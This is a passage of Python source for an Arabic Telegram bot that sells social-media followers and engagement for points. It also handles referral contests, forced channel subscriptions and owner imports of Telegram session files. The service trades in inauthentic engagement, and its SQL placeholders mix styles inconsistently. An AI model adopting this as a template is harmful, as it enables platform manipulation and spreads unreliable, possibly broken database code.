                f"{icon} *{phone or fname}*\n{result_msg}",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        # ليس ملفاً — تذكير
        await update.message.reply_text(
            "🔓 أنت في وضع إزالة التحقق — أرسل ملف الجلسة أو أرسل /start للخروج."
        )
        return

    if state == "await_fund_channel":
        await update.message.reply_text(
            "⚠️ لم يصلني نص. يرجى إرسال *يوزرنيم قناتك كرسالة نصية* مباشرة، مثال: @mychannel\n"
            "(لا ترسله كمشاركة أو توجيه لمنشور — اكتب اليوزرنيم بنفسك)",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    if state.startswith("await_") or state.startswith("os_await"):
        await update.message.reply_text("⚠️ لم يصلني نص. يرجى إرسال ردك كرسالة نصية فقط.")
        return
    is_own = (update.effective_user.id == OWNER_ID)

    # ── fallback: ملف ZIP من المالك → استيراد جلسات ──────────────────────
    if is_own and update.message.document:
        doc_fb = update.message.document
        fname_fb = (doc_fb.file_name or "").lower()
        mime_fb  = (doc_fb.mime_type or "").lower()
        if fname_fb.endswith(".zip") or "zip" in mime_fb:
            await handle_zip_file(update, context)
            return
        # ملف .session فردي وصل هنا بدلاً من handle_session_file
        if fname_fb.endswith(".session"):
            await handle_session_file(update, context)
            return
        # ملف .json فردي وصل هنا بدلاً من handle_json_file
        if fname_fb.endswith(".json") or "json" in mime_fb:
            await handle_json_file(update, context)
            return

    await update.message.reply_text("🏠 القائمة الرئيسية:", reply_markup=main_menu_kb(is_own))


async def _save_service(update, context, price: float):
    """حفظ الخدمة الجديدة بعد تحديد جميع القيم"""
    cat      = context.user_data.get("new_svc_cat", "followers")
    api_id   = context.user_data.get("new_svc_api_id")
    panel    = context.user_data.get("new_svc_panel", 1)
    platform = context.user_data.get("new_svc_platform", "tg")
    name     = context.user_data.get("new_svc_name")
    mn       = context.user_data.get("new_svc_min", 0)
    mx       = context.user_data.get("new_svc_max", 0)
    desc     = context.user_data.get("new_svc_desc", "")
    with db_conn() as c:
        c.execute(
            "INSERT INTO services (category,api_service_id,panel,platform,name_ar,description,min_qty,max_qty,price_per_point) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)",
            (cat, api_id, panel, platform, name, desc, mn, mx, price)
        )
    site_name = PANEL_MAP.get(panel, PANEL_MAP[1])["name"]
    await update.message.reply_text(
        f"✅ تمت إضافة الخدمة *'{name}'* بنجاح!\n\n"
        f"🌐 الموقع: {site_name}\n"
        f"📉 الحد الأدنى: {mn}\n"
        f"📈 الحد الأعلى: {mx}\n"
        f"💰 السعر: {fmt_price(price)} نقطة/1000 وحدة",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=owner_settings_kb()
    )
    context.user_data["state"] = "main_menu"


# ────────────────────────────────────────────────────────────
#  معالج Callback
# ────────────────────────────────────────────────────────────
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q      = update.callback_query
    # ملاحظة: لا نستدعي q.answer() هنا بدون محتوى — تيليجرام يسمح بالرد على
    # الـ callback_query مرة واحدة فقط. كل فرع أدناه يستدعي q.answer() بنفسه
    # عند الحاجة (فارغاً أو مع تنبيه). استدعاؤه هنا مسبقاً كان يجعل أي استدعاء
    # لاحق يفشل بخطأ "query is too old ... cannot answer it more than once"،
    # فيتوقف تنفيذ الفرع قبل تحديث الرسالة (مثال: الهدية اليومية كانت تُضاف
    # في قاعدة البيانات لكن الرسالة/التنبيه لا يظهران للمستخدم إطلاقاً).
    data   = q.data
    user   = q.from_user
    is_own = (user.id == OWNER_ID)

    # ── فحص الحظر: العضو المحظور لا يستطيع استخدام البوت (المالك مستثنى دائماً) ──
    if not is_own and is_user_banned(user.id):
        await q.answer("🚫 تم حظرك من استخدام هذا البوت.", show_alert=True)
        return

    # ── وضع الصيانة: يُحجب كل شيء عن غير المالك، حتى يستطيع المالك دائماً الوصول للوحته لإلغائها ──
    if is_maintenance_on() and not is_own:
        await q.answer()
        await q.edit_message_text(MAINTENANCE_MESSAGE, parse_mode=ParseMode.MARKDOWN)
        return

    # ── فرض الاشتراك الإجباري على جميع المستخدمين المتحققين، بمن فيهم المالك (الاشتراك مقدس) ──
    # ملاحظة: "main_menu" لم يعد مستثنى — الضغط على زر «القائمة الرئيسية» يعيد فحص
    # القنوات الإجبارية أيضاً، حتى لا يبقى مستخدم قديم لم يرَ قناة أُضيفت حديثاً.
    # الاستثناء الوحيد: المالك أثناء استخدامه الفعلي لأزرار لوحة التحكم os:،
    # حتى لا يُحبَس خارج اللوحة التي يحتاجها لإدارة/إصلاح القنوات الإجبارية نفسها.
    _GATE_EXEMPT = {"check_mandatory_join", "noop", "skip_mandatory_gate"}
    _owner_admin_action = is_own and data.startswith("os:")
    if data not in _GATE_EXEMPT and not data.startswith("join_verify:") and not _owner_admin_action:
        try:
            _db_user = get_user(user.id)
            if _db_user and _db_user.get("verified", 0):
                _unjoined = await get_unjoined_mandatory_channels(context, user.id)
                if _unjoined:
                    _remaining = max(0, len(_unjoined) - MANDATORY_PAGE_SIZE)
                    _more_note = (
                        f"\n\n➕ يوجد *{_remaining}* قناة إضافية ستظهر تلقائياً بعد إكمال هذه المجموعة."
                        if _remaining > 0 else ""
                    )
                    await q.edit_message_text(
                        f"📢 *يجب عليك الاشتراك بالقنوات الجديدة أولاً للمتابعة:*{_more_note}",
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=mandatory_join_kb(_unjoined, is_owner=is_own)
                    )
                    context.user_data["state"] = "await_mandatory_join"
                    return
        except Exception as _gate_err:
            logger.warning(f"⚠️ خطأ في فحص القنوات الإجبارية (callback) للمستخدم {user.id}: {_gate_err}")
            # نتابع التنفيذ الطبيعي حتى لا يصمت البوت

    if data == "skip_mandatory_gate":
        if user.id != OWNER_ID:
            await q.answer("⛔ هذا الخيار للمالك فقط.", show_alert=True)
            return
        await q.answer("⏭ تم التخطي")
        db_user = get_user(user.id)
        if db_user and db_user.get("verified", 0):
            context.user_data["state"] = "main_menu"
            db_user = get_user(user.id)
            pts = db_user["points"] if db_user else 0
            await q.edit_message_text(
                f"🏠 *القائمة الرئيسية*\n💰 رصيدك: {pts} نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(True)
            )
        else:
            await proceed_after_mandatory(update, context, edit=True)
        return

    # ── القائمة الرئيسية ──
    if data == "main_menu":
        context.user_data["state"] = "main_menu"
        db_user = get_user(user.id)
        pts = db_user["points"] if db_user else 0
        await q.edit_message_text(
            f"🏠 *القائمة الرئيسية*\n💰 رصيدك: {pts} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu_kb(is_own)
        )
        return

    # ── قائمة "خدمات" (منصات: تيلجرام، وأي منصات أخرى تُضاف مستقبلاً) ──
    if data == "services_menu":
        context.user_data["state"] = "services_menu"
        rows = build_kb_rows(get_menu_items("services_menu"))
        if is_own:
            rows.append([InlineKeyboardButton("🧩 إضافة/إزالة خيار", callback_data="mb_menu:services_menu")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")])
        await q.edit_message_text(
            "🛍 *خدمات*\nاختر المنصة المطلوبة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    # ── قائمة أي منصة داخل "خدمات" (تيلجرام/انستغرام/تيك توك/واتساب/فيس بوك/يوتيوب) ──
    if data in SERVICE_PLATFORM_MENUS:
        context.user_data["state"] = data
        # نحفظ المنصة الحالية حتى تُفلتر خدمات الفئة (cat:) لهذه المنصة تحديداً
        context.user_data["current_platform"] = PLATFORM_MENU_MAP.get(data, "tg")
        items = get_menu_items(data)
        rows = build_kb_rows(items)
        platform_label = next((lbl for lbl, val in SERVICE_PLATFORMS if val == data), "خدمات")
        if is_own:
            rows.append([InlineKeyboardButton("🧩 إضافة/إزالة خيار", callback_data=f"mb_menu:{data}")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")])
        body = "اختر الخدمة المطلوبة:" if items else "⚠️ لا توجد خدمات مضافة هنا حالياً.\nتواصل مع المالك لإضافتها."
        await q.edit_message_text(
            f"{platform_label}\n{body}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    # ── فئات الخدمات ──
    if data.startswith("cat:"):
        cat = data.split(":")[1]
        await show_category_services(update, context, cat)
        return

    # ── زر نصي مخصص أضافه المالك (يعرض نص فقط) ──
    if data.startswith("mi_text:"):
        mi_id = int(data.split(":")[1])
        with db_conn() as c:
            item = c.execute("SELECT * FROM menu_items WHERE id=?", (mi_id,)).fetchone()
        if not item:
            await q.answer("⚠️ هذا الزر لم يعد موجوداً.", show_alert=True)
            return
        content = item["action_value"] or ""
        # تنبيه تيليجرام (show_alert) لا يقبل أكثر من 200 حرف تقريباً، وأي نص أطول
        # كان يتسبب بفشل صامت (استثناء يُسجَّل في اللوغ فقط) فلا يرى المستخدم شيئاً إطلاقاً.
        # لذلك نعرض النصوص القصيرة كتنبيه فوري، والطويلة كرسالة عادية بدون حد للطول.
        if len(content) <= 200:
            try:
                await q.answer(content, show_alert=True)
                return
            except Exception as e:
                logger.warning(f"⚠️ فشل عرض تنبيه mi_text كـ alert، سيُرسل كرسالة عادية: {e}")
        await q.answer()
        await context.bot.send_message(user.id, content or "—")
        return

    # ── عرض خدمة بعينها ──
    if data.startswith("svc:"):
        svc_id = int(data.split(":")[1])
        with db_conn() as c:
            svc = c.execute("SELECT * FROM services WHERE id=?", (svc_id,)).fetchone()
        if not svc:
            await q.edit_message_text("⚠️ الخدمة غير موجودة.", reply_markup=back_kb())
            return
        cat = svc["category"]
        context.user_data["smm_svc_db_id"] = svc_id
        context.user_data["smm_svc"] = dict(svc)
        context.user_data["smm_cat"] = cat
        context.user_data["state"] = "await_smm_qty"
        await q.edit_message_text(
            f"🔹 *{svc['name_ar']}*\n\n"
            f"📉 الحد الأدنى: {svc['min_qty']}\n"
            f"📈 الحد الأعلى: {svc['max_qty']}\n"
            f"💰 السعر: {fmt_price(svc['price_per_point'])} نقطة / 1000 وحدة\n\n"
            f"🔢 أرسل *الكمية* المطلوبة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data=f"cat:{cat}")]
            ])
        )
        return

    # ── رجوع داخل مسار SMM ──
    if data == "smm_back:qty":
        # رجوع لخطوة الكمية — أعد عرض بطاقة الخدمة
        svc = context.user_data.get("smm_svc", {})
        if not svc:
            await q.edit_message_text("⚠️ انتهت الجلسة. ابدأ من جديد.", reply_markup=main_menu_kb(is_own))
            return
        cat = context.user_data.get("smm_cat", svc.get("category", ""))
        context.user_data["state"] = "await_smm_qty"
        await q.edit_message_text(
            f"🔹 *{svc['name_ar']}*\n\n"
            f"📉 الحد الأدنى: {svc['min_qty']}\n"
            f"📈 الحد الأعلى: {svc['max_qty']}\n"
            f"💰 السعر: {fmt_price(svc['price_per_point'])} نقطة / 1000 وحدة\n\n"
            f"🔢 أرسل *الكمية* المطلوبة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data=f"cat:{cat}")]
            ])
        )
        return

    if data == "smm_back:link":
        # رجوع لخطوة الرابط — أعد عرض طلب الرابط مع الكمية المحفوظة
        svc  = context.user_data.get("smm_svc", {})
        qty  = context.user_data.get("smm_qty", 0)
        cost = context.user_data.get("smm_cost", 0)
        if not svc:
            await q.edit_message_text("⚠️ انتهت الجلسة. ابدأ من جديد.", reply_markup=main_menu_kb(is_own))
            return
        context.user_data["state"] = "await_smm_link"
        await q.edit_message_text(
            f"✅ الكمية: {qty} | التكلفة: {cost} نقطة\n\n"
            f"📎 أرسل *رابط* الحساب/القناة/البوست:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع (تغيير الكمية)", callback_data="smm_back:qty")]
            ])
        )
        return

    # ── تأكيد الطلب (أزرار) ──
    if data.startswith("confirm_order:"):
        action = data.split(":")[1]
        if context.user_data.get("state") != "confirm_smm":
            await q.edit_message_text("⚠️ انتهت صلاحية هذا الطلب. ابدأ من جديد.", reply_markup=main_menu_kb(is_own))
            return
        if action == "yes":
            svc  = context.user_data.get("smm_svc", {})
            qty  = context.user_data.get("smm_qty", 0)
            cost = context.user_data.get("smm_cost", 0)
            link = context.user_data.get("smm_link", "")
            # ── تحقق من تقييد الإحالة ──
            _db_u_chk = get_user(user.id)
            if _db_u_chk and _db_u_chk.get("referral_points_blocked"):
                await q.edit_message_text(
                    "🔒 *حسابك موقوف مؤقتاً عن استخدام النقاط.*\n\n"
                    "تم رصد نشاط مشبوه في إحالاتك. تواصل مع المالك لرفع التقييد.",
                    parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu_kb(is_own))
                return
            if not deduct_points(user.id, cost):
                await q.edit_message_text("❌ نقاطك غير كافية.", reply_markup=main_menu_kb(is_own))
                context.user_data["state"] = "main_menu"
                return
            api_res = smm_create_order(svc["api_service_id"], link, qty, panel=svc.get("panel", 1))
            if "error" in api_res or not api_res.get("order"):
                add_points(user.id, cost)
                err_msg = md_escape(api_res.get("error", "خطأ غير معروف من الموقع"))
                await q.edit_message_text(
                    f"❌ *فشل الطلب:* {err_msg}\n✅ تمت إعادة نقاطك.\n\n"
                    f"{LINK_ERROR_GUIDANCE}",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=main_menu_kb(is_own)
                )
                context.user_data["state"] = "main_menu"
                return
            api_oid = str(api_res.get("order", ""))
            code    = next_order_code(user.id)
            with db_conn() as c:
                c.execute(
                    "INSERT INTO orders (user_id,service_id,link,quantity,cost_points,api_order_id,order_code) VALUES (?,?,?,?,?,?,?)",
                    (user.id, svc["id"], link, qty, cost, api_oid, code)
                )
            await q.edit_message_text(
                f"✅ *تمت العملية بنجاح!*\n\n"
                f"🔹 الخدمة: {svc['name_ar']}\n"
                f"🔢 الكمية: {qty}\n"
                f"💰 التكلفة: {cost} نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
            await context.bot.send_message(
                user.id,
                f"📌 *كود عمليتك هو:* `{code}`\nاحفظه قد تحتاجه لاحقاً.",
                parse_mode=ParseMode.MARKDOWN
            )
            await notify_group(
                context.application,
                f"🆕 <b>طلب جديد</b>\n"
                f"👤 المستخدم: <a href='tg://user?id={user.id}'>{user.full_name}</a>\n"
                f"🔹 الخدمة: {svc['name_ar']}\n"
                f"🔗 الرابط: {link}\n"
                f"🔢 الكمية: {qty}\n"
                f"💰 التكلفة: {cost} نقطة\n"
                f"📌 الكود: {code}"
            )
        else:
            await q.edit_message_text("❌ تم إلغاء الطلب.", reply_markup=main_menu_kb(is_own))
        context.user_data["state"] = "main_menu"
        return

    # ── تواصل مع الدعم ──
    if data == "contact_support":
        contact = get_setting("owner_contact") or ""
        if not contact:
            await q.edit_message_text(
                "⚠️ خدمة الدعم غير متاحة حالياً.",
                reply_markup=back_kb()
            )
            return
        label = get_setting("support_contact_label") or "🛎 تواصل مع الدعم"
        await q.edit_message_text(
            "🛎 *تواصل مع الدعم*\n\nاضغط الزر أدناه للتواصل معنا مباشرة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(label, url=contact)],
                [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
            ])
        )
        return

    # ── رابط الدعوة ──
    if data == "referral":
        await q.edit_message_text(
            "👻 *رابط الدعوة*\n\nاختر ما تريد:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 رابط دعوتي", callback_data="referral:my_link")],
                [InlineKeyboardButton("🏆 الأكثر دعوةً", callback_data="referral:top")],
                [InlineKeyboardButton("🥇 تصنيف المسابقة", callback_data="referral_contest_view")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")],
            ])
        )
        return

    if data == "referral:my_link":
        bot_username = (await context.bot.get_me()).username
        link = f"https://t.me/{bot_username}?start={user.id}"
        rp   = get_setting("referral_points") or "30"
        db_user = get_user(user.id)
        with db_conn() as c:
            credited  = c.execute(
                "SELECT COUNT(*) as cnt FROM users WHERE invited_by=? AND referral_credited=1",
                (user.id,)
            ).fetchone()["cnt"]
            pending   = c.execute(
                "SELECT COUNT(*) as cnt FROM users WHERE invited_by=? AND referral_credited=0",
                (user.id,)
            ).fetchone()["cnt"]
        pending_line = f"\n⏳ بانتظار إكمال التحقق: {pending} شخص" if pending else ""
        await q.edit_message_text(
            f"🔗 *رابط دعوتك الشخصي:*\n\n`{link}`\n\n"
            f"✅ تحصل على *{rp} نقطة* لكل صديق يُكمل التحقق عبر رابطك\n"
            f"👥 إحالات مكتملة (حصلت على نقاطها): {credited} شخص{pending_line}\n"
            f"💰 رصيدك: {db_user['points'] if db_user else 0} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="referral")]])
        )
        return

    if data == "referral:top":
        rows = [
            [InlineKeyboardButton("🕐 آخر 24 ساعة", callback_data="top_ref_pick:24h")],
            [InlineKeyboardButton("📅 اليوم الحالي (منذ 00:00 بالتوقيت العالمي)", callback_data="top_ref_pick:day")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="referral")],
        ]
        await q.edit_message_text(
            "🏆 *الأكثر دعوةً*\n\nاختر الفترة التي تريد عرض المتصدرين خلالها:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    # ── الأكثر دعوةً (للأعضاء — يختارون الفترة أولاً) ──
    if data == "top_ref_today":
        rows = [
            [InlineKeyboardButton("🕐 آخر 24 ساعة", callback_data="top_ref_pick:24h")],
            [InlineKeyboardButton("📅 اليوم الحالي (منذ 00:00 بالتوقيت العالمي)", callback_data="top_ref_pick:day")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")],
        ]
        await q.edit_message_text(
            "🏆 *الأكثر دعوةً*\n\nاختر الفترة التي تريد عرض المتصدرين خلالها:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("top_ref_pick:"):
        period = data.split(":", 1)[1]
        since, title = _referral_period_bounds(period)
        rows = get_top_referrers_since(since, limit=10)
        text = _format_top_referrers(rows, title)
        await q.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="top_ref_today")]])
        )
        return

    # ── الأكثر إرسالاً لرابط الدعوة (للمالك — اختيار الفترة) ──
    if data == "os:top_referrers" and is_own:
        rows = [
            [InlineKeyboardButton("🕐 آخر 24 ساعة (من لحظة الضغط)", callback_data="os:top_ref:24h")],
            [InlineKeyboardButton("📅 آخر يوم (بالتوقيت العالمي)", callback_data="os:top_ref:day")],
            [InlineKeyboardButton("🗓 آخر أسبوع", callback_data="os:top_ref:week")],
            [InlineKeyboardButton("🗓 آخر شهر", callback_data="os:top_ref:month")],
            [InlineKeyboardButton("🔄 تصفير العداد", callback_data="os:top_ref_reset_confirm")],
            [InlineKeyboardButton("🔍 إحالات شخص معين", callback_data="os:ref_search_user")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")],
        ]
        await q.edit_message_text(
            "🏆 *الأكثر إرسالاً لرابط الدعوة*\n\nاختر الفترة الزمنية:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os:top_ref:") and is_own:
        period = data.split(":", 2)[2]
        since, title = _referral_period_bounds(period)
        rows = get_top_referrers_since(since, limit=10)
        text = _format_top_referrers(rows, title)
        await q.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:top_referrers")]])
        )
        return

    if data == "os:top_ref_reset_confirm" and is_own:
        await q.edit_message_text(
            "⚠️ *تصفير عداد الأكثر إرسالاً لرابط الدعوة*\n\n"
            "سيبدأ العدّ من جديد من هذه اللحظة (لن يتأثر رصيد نقاط أي عضو).\n"
            "هل أنت متأكد؟",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ نعم، صفّر العداد", callback_data="os:top_ref_reset")],
                [InlineKeyboardButton("🔙 إلغاء", callback_data="os:top_referrers")],
            ])
        )
        return

    if data == "os:top_ref_reset" and is_own:
        reset_referral_counter()
        await q.answer("✅ تم تصفير العداد.", show_alert=True)
        await q.edit_message_text(
            "✅ *تم تصفير عداد الأكثر إرسالاً لرابط الدعوة بنجاح.*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:top_referrers")]])
        )
        return

    # ── معالجة رشق الإحالات ──
    if data.startswith("os:ref_keep:") and is_own:
        parts = data.split(":")
        inv_id, rp_pts = int(parts[2]), int(parts[3])
        with db_conn() as _c:
            _c.execute("UPDATE users SET referral_points_blocked=0 WHERE user_id=%s", (inv_id,))
        await q.edit_message_text(
            f"✅ *تم الإبقاء على الإحالة + رفع التقييد عن* `{inv_id}`\n💰 النقاط تبقى معه.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:top_referrers")]]))
        return

    if data.startswith("os:ref_deduct:") and is_own:
        parts = data.split(":")
        inv_id, rp_pts = int(parts[2]), int(parts[3])
        with db_conn() as _c:
            _c.execute("UPDATE users SET points=GREATEST(0, points-%s), referral_points_blocked=0 WHERE user_id=%s", (rp_pts, inv_id))
        await q.edit_message_text(
            f"❌ *تم خصم {rp_pts} نقطة + رفع التقييد عن* `{inv_id}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:top_referrers")]]))
        return

    if data.startswith("os:ref_unblock:") and is_own:
        inv_id = int(data.split(":")[2])
        with db_conn() as _c:
            _c.execute("UPDATE users SET referral_points_blocked=0 WHERE user_id=%s", (inv_id,))
        await q.edit_message_text(
            f"🔓 *تم رفع التقييد عن* `{inv_id}` *بدون خصم.*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:top_referrers")]]))
        return

    if data.startswith("os:ref_extra:") and is_own:
        parts = data.split(":")
        inv_id, rp_pts = int(parts[2]), int(parts[3])
        context.user_data["ref_extra_id"]  = inv_id
        context.user_data["ref_extra_base"] = rp_pts
        context.user_data["state"] = "os_await_ref_extra_pts"
        await q.message.reply_text(
            f"➕ *خصم إضافي من* `{inv_id}`\n\nأرسل عدد النقاط الإضافية للخصم:",
            parse_mode=ParseMode.MARKDOWN)
        return

    # ── إحالات شخص معين (للمالك) ──
    if data == "os:ref_search_user" and is_own:
        context.user_data["state"] = "os_await_ref_user_id"
        await q.answer()
        await q.message.reply_text(
            "🔍 *إحالات شخص معين*\n\nأرسل user_id أو @يوزرنيم:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:top_referrers")]]))
        return

    # ── إعدادات الاشتراك الإجباري بالنقاط ──
    if data == "os:edit_mpoints_price" and is_own:
        cur = get_setting("mandatory_points_price") or "5"
        context.user_data["state"] = "os_await_mpoints_price"
        await q.edit_message_text(
            f"💰 *سعر تمويل الإجباري بالنقاط (لكل عضو)*\n\nالحالي: {cur} نقطة\nأرسل السعر الجديد:",
            parse_mode=ParseMode.MARKDOWN)
        return

    if data == "os:edit_mpoints_min" and is_own:
        cur = get_setting("mandatory_points_min") or "50"
        context.user_data["state"] = "os_await_mpoints_min"
        await q.edit_message_text(
            f"💰 *الحد الأدنى للأعضاء (إجباري-نقاط)*\n\nالحالي: {cur} عضو\nأرسل الحد الجديد:",
            parse_mode=ParseMode.MARKDOWN)
        return

    # ── مسابقة رابط الدعوة (للمالك) ──
    if data == "os:referral_contest" and is_own:
        contest   = get_referral_contest()
        ctype     = contest["type"]
        now_utc   = datetime.now(timezone.utc)
        if ctype == "open":
            active_note = "\n\n🟢 *المسابقة نشطة الآن — مفتوحة (بدون وقت محدد)*"
        elif ctype == "limited":
            end_dt = contest["end"]
            if end_dt and end_dt > now_utc:
                remaining   = _format_contest_time_remaining(end_dt)
                active_note = f"\n\n🟡 *المسابقة نشطة — الوقت المتبقي: {remaining}*"
            else:
                active_note = "\n\n🔴 *المسابقة انتهت*"
        else:
            active_note = "\n\n⚫ *لا توجد مسابقة نشطة حالياً*"
        kb_rows = [
            [InlineKeyboardButton("🔓 مفتوح (بدون وقت)", callback_data="os:contest:open")],
            [InlineKeyboardButton("⏳ محدد (بوقت)", callback_data="os:contest:limited")],
            [InlineKeyboardButton("🏁 إنهاء المسابقة", callback_data="os:contest:stop")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")],
        ]
        await q.edit_message_text(
            f"🎯 *مسابقة رابط الدعوة*{active_note}\n\nاختر نوع المسابقة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(kb_rows)
        )
        return

    if data == "os:contest:open" and is_own:
        now_utc = datetime.now(timezone.utc)
        set_setting("referral_contest_type",  "open")
        set_setting("referral_contest_start", now_utc.isoformat())
        set_setting("referral_contest_end",   "")
        await q.edit_message_text(
            "✅ *تم بدء مسابقة رابط الدعوة (مفتوحة)*\n\n"
            "لا يوجد وقت محدد للانتهاء — ستستمر حتى تُوقفها يدوياً.\n"
            "يرى الأعضاء قائمة المتصدرين بدون ذكر الوقت.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:referral_contest")]])
        )
        return

    if data == "os:contest:limited" and is_own:
        context.user_data["state"] = "os_await_contest_duration"
        await q.edit_message_text(
            "⏳ *مسابقة محدودة بوقت*\n\n"
            "أرسل المدة الزمنية بالصيغة التالية:\n"
            "• `7s` ← 7 ثوانٍ\n"
            "• `30m` ← 30 دقيقة\n"
            "• `24h` ← 24 ساعة\n"
            "• `7d` ← 7 أيام\n\n"
            "مثال: أرسل `7d` لمسابقة تدوم 7 أيام",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:contest:stop" and is_own:
        set_setting("referral_contest_type", "none")
        await q.edit_message_text(
            "🛑 *تم إيقاف المسابقة بنجاح.*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:referral_contest")]])
        )
        return

    # ── مسابقة رابط الدعوة (للأعضاء — عرض المتصدرين) ──
    if data == "referral_contest_view":
        contest  = get_referral_contest()
        ctype    = contest["type"]
        now_utc  = datetime.now(timezone.utc)
        back_to_referral = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="referral")]])
        if ctype == "none":
            await q.edit_message_text(
                "⚫ *لا توجد مسابقة نشطة حالياً.*\n\nتابع البوت لمعرفة موعد انطلاق المسابقة القادمة!",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_to_referral
            )
            return
        since_dt = contest["start"]
        lb_rows  = get_top_referrers_since(since_dt, limit=10)
        if ctype == "limited":
            end_dt = contest["end"]
            if end_dt and end_dt > now_utc:
                remaining = _format_contest_time_remaining(end_dt)
                header    = f"🏆 *مسابقة رابط الدعوة*\n⏳ *الوقت المتبقي: {remaining}*\n\n"
            else:
                header = "🏆 *مسابقة رابط الدعوة — انتهت المسابقة*\n\n"
        else:  # open — لا يُظهر وقتاً للأعضاء
            header = "🏆 *مسابقة رابط الدعوة*\n\n"
        leaderboard = _format_top_referrers(lb_rows, "المتصدرون")
        lb_lines    = leaderboard.split("\n")
        lb_body     = "\n".join(lb_lines[1:]) if len(lb_lines) > 1 else leaderboard
        await q.edit_message_text(
            header + lb_body,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_to_referral
        )
        return

    # ── تجميع نقاط — قائمة فرعية (هدية يومية | انضمام بقنوات) ──
    if data in ("collect_points", "daily_gift", "join_channels_menu"):
        db_user = get_user(user.id)
        rows = [
            [InlineKeyboardButton("🎁 الهدية اليومية", callback_data="daily_gift_screen")],
            [InlineKeyboardButton("📡 الانضمام بقنوات", callback_data="join_channels")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")],
        ]
        await q.edit_message_text(
            f"💰 *تجميع النقاط*\n\n"
            f"💰 رصيدك الحالي: {db_user['points'] if db_user else 0} نقطة\n\n"
            f"اختر أحد الخيارين للحصول على نقاط:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    # ── شاشة الهدية اليومية ──
    if data == "daily_gift_screen":
        today = str(date.today())
        gift = int(get_setting("daily_gift_points") or "50")
        with db_conn() as c:
            gift_row = c.execute("SELECT last_claim FROM daily_gifts WHERE user_id=%s", (user.id,)).fetchone()
        already_claimed = gift_row and gift_row["last_claim"] == today
        db_user = get_user(user.id)
        if already_claimed:
            btn = [InlineKeyboardButton("⏰ تم استلام هديتك اليوم — عد غداً", callback_data="noop")]
        else:
            btn = [InlineKeyboardButton(f"🎁 استلام الهدية (+{gift} نقطة)", callback_data="daily_gift_collect")]
        rows = [
            btn,
            [InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")],
        ]
        await q.edit_message_text(
            f"🎁 *الهدية اليومية*\n\n"
